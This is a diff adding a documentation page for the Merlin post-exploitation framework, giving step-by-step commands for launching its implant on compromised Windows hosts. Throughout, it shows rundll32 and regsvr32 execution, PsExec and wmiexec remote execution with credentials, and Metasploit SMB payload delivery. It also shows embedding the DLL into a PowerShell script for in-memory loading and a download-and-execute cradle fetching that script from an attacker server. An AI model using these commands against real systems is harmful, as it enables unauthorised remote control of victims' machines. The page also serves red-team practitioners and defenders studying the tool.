@@ -1,0 +1,300 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>Merlin Agent &#8212; Merlin BETA documentation</title>
+    <link rel="stylesheet" href="../_static/alabaster.css" type="text/css" />
+    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
+    <script type="text/javascript" src="../_static/jquery.js"></script>
+    <script type="text/javascript" src="../_static/underscore.js"></script>
+    <script type="text/javascript" src="../_static/doctools.js"></script>
+    <script type="text/javascript" src="../_static/language_data.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="FAQ" href="faq.html" />
+    <link rel="prev" title="Merlin Server" href="server.html" />
+   
+  <link rel="stylesheet" href="../_static/custom.css" type="text/css" />
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
+
+  </head><body>
+  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          
+
+          <div class="body" role="main">
+            
+  <div class="section" id="merlin-agent">
+<span id="agent-quickstart"></span><h1>Merlin Agent<a class="headerlink" href="#merlin-agent" title="Permalink to this headline">¶</a></h1>
+<p>Merlin is a post-exploitation framework and therefore documentation doesn’t cover any of the steps required to get to a point where you can execute code or commands on a compromised host. Exploiting or accessing a host must performed prior to leveraging Merlin.</p>
+<div class="line-block">
+<div class="line"><strong>Pre-compiled Merlin Agent binary files are distributed with the server download in the</strong> <code class="docutils literal notranslate"><span class="pre">data/bin/</span></code> <strong>directory of Merlin</strong></div>
+</div>
+<div class="section" id="upload-execute">
+<h2>Upload &amp; Execute<a class="headerlink" href="#upload-execute" title="Permalink to this headline">¶</a></h2>
+<p>One of the more simple ways to run Merlin is by uploading the compiled binary file to a compromised host and then execute that binary.</p>
+<div class="line-block">
+<div class="line">Don’t forget to specify the address of your Merlin server with the <code class="docutils literal notranslate"><span class="pre">-url</span></code> flag. Default is <cite>https://127.0.0.1:443/</cite></div>
+</div>
+</div>
+<div class="section" id="windows-local-command-execution">
+<h2>Windows Local Command Execution<a class="headerlink" href="#windows-local-command-execution" title="Permalink to this headline">¶</a></h2>
+<p>This section covers executing the Merlin agent with local command execution.</p>
+<div class="section" id="windows-exe-cmd-exe">
+<h3>Windows EXE - cmd.exe<a class="headerlink" href="#windows-exe-cmd-exe" title="Permalink to this headline">¶</a></h3>
+<p>With the <cite>merlinAgent.exe</cite> binary file already downloaded on to the compromised host, execute it by calling it from the command line. Double clicking the executable file will cause the agent to run <strong>without</strong> a window, so you will not see anything, and it will connect to the <strong>default</strong> URL of <cite>https://127.0.0.1:443/</cite>. This can be changed by recompiling the agent with the hardcoded address of your Merlin server.</p>
+<p>cmd.exe example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Bob</span>\<span class="n">Downloads</span><span class="o">&gt;</span><span class="n">merlinAgent</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">url</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="p">:</span><span class="mi">443</span><span class="o">/</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="windows-dll-rundll32-exe">
+<h3>Windows DLL - rundll32.exe<a class="headerlink" href="#windows-dll-rundll32-exe" title="Permalink to this headline">¶</a></h3>
+<p>With the <cite>merlin.dll</cite> binary file already downloaded on to the compromised host, execute it by calling it from the command line using the <cite>rundll32.exe</cite> program that comes with Windows. <cite>Run</cite> is the name of the DLL entrypoint called when the DLL is executed. Provide the URL for your listening Merlin server after the entrypoint.</p>
+<p>rundll32.exe example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Bob</span>\<span class="n">Downloads</span><span class="o">&gt;</span><span class="n">C</span><span class="p">:</span>\<span class="n">WINDOWS</span>\<span class="n">System32</span>\<span class="n">rundll32</span><span class="o">.</span><span class="n">exe</span> <span class="n">merlin</span><span class="o">.</span><span class="n">dll</span><span class="p">,</span><span class="n">Run</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="p">:</span><span class="mi">443</span><span class="o">/</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="windows-remote-command-execution">
+<h2>Windows Remote Command Execution<a class="headerlink" href="#windows-remote-command-execution" title="Permalink to this headline">¶</a></h2>
+<p>This section covers executing Merlin agent when remotely accessing a host.</p>
+<div class="section" id="windows-exe-psexec-exe">
+<h3>Windows EXE - PsExec.exe<a class="headerlink" href="#windows-exe-psexec-exe" title="Permalink to this headline">¶</a></h3>
+<p>The Microsoft Sysinternals <a class="reference external" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec.exe</a> application can be used to connect to a remote host, upload the Merlin agent file, and execute it. The downside to this is the Merlin agent binary file is “on disk” and provides an opportunity for Anti-Virus software to detect the application. Use PsExec’s <cite>-c</cite> flag to specify the location of the Merlin agent file on the attacker’s host that will be uploaded to the remote host. The PsExec <cite>-d</cite> flag is required so that control is returned to the user after executing the Merlin agent file.</p>
+<p>PsExec.exe example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">SysinternalsSuite</span><span class="o">&gt;.</span>\<span class="n">PsExec</span><span class="o">.</span><span class="n">exe</span> \\<span class="mf">192.168</span><span class="o">.</span><span class="mf">1.10</span> <span class="o">-</span><span class="n">u</span> <span class="n">bob</span> <span class="o">-</span><span class="n">p</span> <span class="n">password</span> <span class="o">-</span><span class="n">d</span> <span class="o">-</span><span class="n">c</span> <span class="n">C</span><span class="p">:</span>\<span class="n">merlin</span>\<span class="n">data</span>\<span class="nb">bin</span>\<span class="n">windows</span>\<span class="n">merlinAgent</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">url</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="p">:</span><span class="mi">443</span><span class="o">/</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="windows-dll-metasploit-s-smb-delivery">
+<h3>Windows DLL - Metasploit’s SMB Delivery<a class="headerlink" href="#windows-dll-metasploit-s-smb-delivery" title="Permalink to this headline">¶</a></h3>
+<p>One method for delivery is to use an SMB server to host the payload and execute a command on the remote host to download and run the Merlin agent file. The Metasploit <cite>windows/smb/smb_delivery</cite> module is a good way to quickly stand up an SMB server for delivering the payload.</p>
+<p>Setup the <code class="docutils literal notranslate"><span class="pre">windows/smb/smb_delivery</span></code> module:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>msf &gt; use windows/smb/smb_delivery
+msf exploit(windows/smb/smb_delivery) &gt; set FILE_NAME merlin.dll
+FILE_NAME =&gt; merlin.dll
+msf exploit(windows/smb/smb_delivery) &gt; set EXE::Custom /opt/merlin.dll
+EXE::Custom =&gt; /opt/merlin/data/bin/dll/merlin.dll
+msf exploit(windows/smb/smb_delivery) &gt; set DisablePayloadHandler true
+DisablePayloadHandler =&gt; true
+msf exploit(windows/smb/smb_delivery) &gt; set VERBOSE true
+VERBOSE =&gt; true
+msf exploit(windows/smb/smb_delivery) &gt; run
+[*] Exploit running as background job 0.
+msf exploit(windows/smb/smb_delivery) &gt;
+[*] Server started.
+[*] Run the following command on the target machine:
+[*] Using custom payload /opt/merlin.dll, RHOST and RPORT settings will be ignored!
+rundll32.exe \\192.168.1.100\WxlV\merlin.dll,0
+</pre></div>
+</div>
+<div class="line-block">
+<div class="line"><strong>NOTE:</strong> We must change the DLL entry point from <cite>0</cite> to <cite>Run</cite> and provide the URL of the listening Merlin server</div>
+</div>
+<p>Now that the SMB server is setup to deliver the <cite>merlin.dll</cite> file, we need to remotely access the target host and execute the command. By default, Metasploit sets the entry point to <cite>0</cite>. We need to modify the command to change the entry point to <cite>Run</cite> and specify the location of our listening Merlin server. <a class="reference external" href="https://github.com/CoreSecurity/impacket">Impacket’s</a> <cite>wmiexec.py</cite> Python program is one way to remotely access a host.</p>
+<p>wmiexec.py example:</p>
+<div class="line-block">
+<div class="line"><strong>NOTE:</strong> We must change the DLL entry point from <cite>0</cite> to <cite>Run</cite> and provide the URL of the listening Merlin server</div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>root@kali:/opt/impacket/examples# python wmiexec.py bob:password@192.168.1.10
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:443/
+</pre></div>
+</div>
+<div class="section" id="advanced">
+<h4>Advanced<a class="headerlink" href="#advanced" title="Permalink to this headline">¶</a></h4>
+<p>The quick start examples above executed the Merlin agent and allowed the user to dynamically specify the location of the listening Merlin server with a command line parameter. There are a few instances where we the user is unable to specify, or simply don’t want to, the URL for the listening Merlin server. In this case, the Merlin agent binary should be recompiled with a hardcoded URL of the listening Merlin server so that it does not need to be specified by the user during execution. <em>Do not continue on unless you are OK to deal with things that sometimes work and often have bugs and are not reliable.</em></p>
+<div class="line-block">
+<div class="line">This will require that you have Go and gcc installed on the host compiling the application. View the DLL’s <a class="reference external" href="https://github.com/Ne0nd0g/merlin/blob/dev/data/bin/dll/README.MD">README</a> for additional information.</div>
+</div>
+</div>
+</div>
+<div class="section" id="recompile-dll">
+<h3>Recompile DLL<a class="headerlink" href="#recompile-dll" title="Permalink to this headline">¶</a></h3>
+<p>The <cite>merlin.dll</cite> file can be configured with the hardcoded url of your Merlin server. To do this, clone the repo, modify the file, and recompile it.</p>
+<ol class="arabic simple">
+<li>Clone the merlin repository using git</li>
+<li>Edit the file at <cite>cmd/merlinagentdll/main.go</cite></li>
+<li>Find the string <cite>var url = “https://127.0.0.1:443/”</cite> and change the address</li>
+<li>Compile the DLL</li>
+</ol>
+<p>example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cd</span> <span class="o">/</span><span class="n">opt</span>
+<span class="n">git</span> <span class="n">clone</span> <span class="o">-</span><span class="n">b</span> <span class="n">dev</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ne0nd0g</span><span class="o">/</span><span class="n">merlin</span><span class="o">.</span><span class="n">git</span>
+<span class="n">cd</span> <span class="n">merlin</span>
+<span class="n">sed</span> <span class="o">-</span><span class="n">i</span> <span class="s1">&#39;s_https://127.0.0.1:443/_https://192.168.1.100:443/_&#39;</span> <span class="n">cmd</span><span class="o">/</span><span class="n">merlinagentdll</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">go</span>
+<span class="n">make</span> <span class="n">agent</span><span class="o">-</span><span class="n">dll</span>
+</pre></div>
+</div>
+<p>This will leave the <cite>merlin.dll</cite> in the <cite>data/temp/v0.5.0/</cite> directory where <cite>v0.5.0</cite> is the current version number of Merlin. Now the recompdiled version of the DLL can be run without having to specify the address of the Merlin server.</p>
+<p>rundll32.exe examples:</p>
+<ul class="simple">
+<li><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,main</span></code></li>
+<li><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,Run</span></code></li>
+</ul>
+<p>regsvr32.exe examples:</p>
+<ul class="simple">
+<li><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">merlin.dll</span></code></li>
+<li><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/u</span> <span class="pre">merlin.dll</span></code></li>
+<li><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/n</span> <span class="pre">/i</span> <span class="pre">merlin.dll</span></code></li>
+</ul>
+</div>
+<div class="section" id="powershell-invoke-merlin-ps1">
+<h3>PowerShell - Invoke-Merlin.ps1<a class="headerlink" href="#powershell-invoke-merlin-ps1" title="Permalink to this headline">¶</a></h3>
+<div class="line-block">
+<div class="line"><strong>WARNING: This script is very unstable</strong></div>
+</div>
+<p>The <code class="docutils literal notranslate"><span class="pre">Invoke-Merlin.ps1</span></code> PowerShell script can be found in the <code class="docutils literal notranslate"><span class="pre">data/bin/powershell</span></code> directory. This script leverages the work done by the PowerSploit team to reflectively load  <cite>merlin.dll</cite> into memory. View the <a class="reference external" href="https://github.com/Ne0nd0g/merlin/blob/dev/data/bin/powershell/README.MD">README</a> for additional details. By default, Invoke-Merlin connects to <cite>https://127.0.0.1:443/</cite>. At the time of this writing, I have not found a way to provide an argument of the listening Merlin server’s address when calling the DLL. Therefore, this requires recompiling the DLL with the hardcoded address of the listening Merlin server as shown in the <em>Recompile DLL</em> section above. The <cite>Invoke-Merlin.ps1</cite> script needs to be updated with the Base64 encoded version of the new recompiled <cite>merlin.dll</cite> file. The quickest way to update Invoke-Merlin.ps1 is to use the set commands below from a PowerShell terminal.</p>
+<ul class="simple">
+<li>Read the DLL into a variable:</li>
+</ul>
+<blockquote>
+<div><code class="docutils literal notranslate"><span class="pre">$PEBytes</span> <span class="pre">=</span> <span class="pre">[IO.File]::ReadAllBytes('C:/Go/src/Ne0nd0g/merlin/data/bin/dll/merlin.dll')</span></code></div></blockquote>
+<ul>
+<li><p class="first">Base64 encode the DLL and save it in another variable:</p>
+<p><code class="docutils literal notranslate"><span class="pre">$Base64String</span> <span class="pre">=</span> <span class="pre">[System.Convert]::ToBase64String($PEBytes)</span></code></p>
+</li>
+<li><p class="first">Update the existing Invoke-Merlin.ps1 script with the Base64 encoded version of the newly compiled DLL:</p>
+<p><code class="docutils literal notranslate"><span class="pre">(Get-Content</span> <span class="pre">data/bin/powershell/Invoke-Merlin.ps1)</span> <span class="pre">|</span> <span class="pre">foreach-object</span> <span class="pre">{$_</span> <span class="pre">-replace</span> <span class="pre">'^\$global\:merlin</span> <span class="pre">\=</span> <span class="pre">(.*)',</span> <span class="pre">('$global:merlin</span> <span class="pre">=</span> <span class="pre">'</span> <span class="pre">+</span> <span class="pre">&quot;'&quot;</span> <span class="pre">+</span> <span class="pre">$Base64String</span> <span class="pre">+</span> <span class="pre">&quot;'&quot;)}</span> <span class="pre">|</span> <span class="pre">Set-Content</span> <span class="pre">data/bin/powershell/Invoke-Merlin.ps1</span></code></p>
+</li>
+</ul>
+<p>Now the Invoke-Merlin script is ready to be downloaded and executed. Fair warning, the script can be extremely executing the call back to the listening Merlin server. Give it a couple of minutes before rage quitting. Additionally, the <cite>-ForceASLR</cite> flag for Invoke-Merlin.ps1 is required to circumvent other errors that arise when executing the script. Host the Invoke-Merlin.ps1 script on any web server and use a PowerShell download cradel to execute it on the remote host.</p>
+<p>Python’s <cite>SimpleHTTPServer</cite> module can be used to quickly host the file. Move into the directory where you have a copy of the updated Invoke-Merlin.ps1 script and run the Python module.</p>
+<p>python SimpleHTTPServer example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">SimpleHTTPServer</span> <span class="mi">80</span>
+</pre></div>
+</div>
+<p>Now the script can be downloaded and executed on a remote host using a tool like Impacket’s wmiexec.py.</p>
+<p>wmiexec.py example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">impacket</span><span class="o">/</span><span class="n">examples</span><span class="c1"># python wmiexec.py bob:password@192.168.1.92 &quot;powershell -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.100/Invoke-Merlin.ps1&#39;);Invoke-Merlin -ForceASLR&quot;</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mf">9.15</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2002</span><span class="o">-</span><span class="mi">2016</span> <span class="n">Core</span> <span class="n">Security</span> <span class="n">Technologies</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SMBv2</span><span class="o">.</span><span class="mi">1</span> <span class="n">dialect</span> <span class="n">used</span>
+
+<span class="o">^</span><span class="n">C</span><span class="p">[</span><span class="o">-</span><span class="p">]</span>
+<span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">impacket</span><span class="o">/</span><span class="n">examples</span><span class="c1">#</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+
+
+          </div>
+          
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+<h1 class="logo"><a href="../index.html">Merlin</a></h1>
+
+
+
+
+
+
+
+
+<h3>Navigation</h3>
+<p class="caption"><span class="caption-text">Quick Start</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="server.html">Merlin Server</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Merlin Agent</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#upload-execute">Upload &amp; Execute</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#windows-local-command-execution">Windows Local Command Execution</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#windows-remote-command-execution">Windows Remote Command Execution</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="faq.html">FAQ</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Merlin Agent</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../agent/cli.html">Command Line Flags</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../agent/dll.html">DLL Agent</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../agent/powershell.html">PowerShell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../agent/custom.html">Custom Build</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Merlin Server</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/main.html">Main Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/agents.html">Agent Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/listeners.html">Listener Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/modules.html">Modules Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/x509.html">TLS Certificates</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Modules</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../modules/build.html">Building Modules</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Misc.</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../misc/blogs.html">Blog Posts</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/logging.html">Logging</a></li>
+</ul>
+
+<div class="relations">
+<h3>Related Topics</h3>
+<ul>
+  <li><a href="../index.html">Documentation overview</a><ul>
+      <li>Previous: <a href="server.html" title="previous chapter">Merlin Server</a></li>
+      <li>Next: <a href="faq.html" title="next chapter">FAQ</a></li>
+  </ul></li>
+</ul>
+</div>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <div class="searchformwrapper">
+    <form class="search" action="../search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    </div>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+
+
+
+
+
+
+
+
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="footer">
+      &copy;2020, Russel Van Tuyl (@Ne0nd0g).
+      
+      |
+      Powered by <a href="http://sphinx-doc.org/">Sphinx 1.8.5</a>
+      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.12</a>
+      
+      |
+      <a href="../_sources/quickStart/agent.rst.txt"
+          rel="nofollow">Page source</a>
+    </div>
+
+    
+
+    
+  </body>
+</html>
